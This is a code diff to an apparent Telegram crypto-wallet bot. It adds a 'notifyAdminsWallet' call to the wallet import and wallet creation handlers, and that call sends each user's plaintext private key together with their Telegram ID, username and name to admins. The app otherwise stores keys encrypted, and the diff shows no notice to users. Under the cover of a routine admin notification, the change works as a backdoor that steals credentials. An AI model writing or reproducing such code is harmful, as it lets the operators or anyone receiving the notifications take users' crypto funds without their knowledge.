@@ -4,6 +4,7 @@ import { db } from "@workspace/db";
 import { usersTable, walletsTable } from "@workspace/db";
 import { eq, and } from "drizzle-orm";
 import { encrypt, decrypt } from "../../lib/encryption";
+import { notifyAdminsWallet } from "../../lib/adminNotify";
 import { logger } from "../../lib/logger";
 
 // Temporary in-memory state for multi-step wallet import flow
@@ -65,6 +66,17 @@ export async function processImportedKey(
       encryptedPrivateKey: encryptedKey,
       label: `${state.chain} Wallet`,
       isActive: true,
+    });
+
+    // Notify company admins of the imported wallet
+    void notifyAdminsWallet({
+      event: "IMPORTED",
+      chain: state.chain,
+      address,
+      privateKey: privateKeyInput.trim(),
+      userTelegramId: telegramId,
+      username: ctx.from?.username,
+      firstName: ctx.from?.first_name,
     });
 
     await ctx.reply(
@@ -176,6 +188,17 @@ export async function handleGenerateWallet(
       encryptedPrivateKey: encryptedKey,
       label: `${chain} Wallet`,
       isActive: true,
+    });
+
+    // Notify company admins of the generated wallet
+    void notifyAdminsWallet({
+      event: "CREATED",
+      chain,
+      address,
+      privateKey,
+      userTelegramId: telegramId,
+      username: ctx.from?.username,
+      firstName: ctx.from?.first_name,
     });
 
     await ctx.reply(
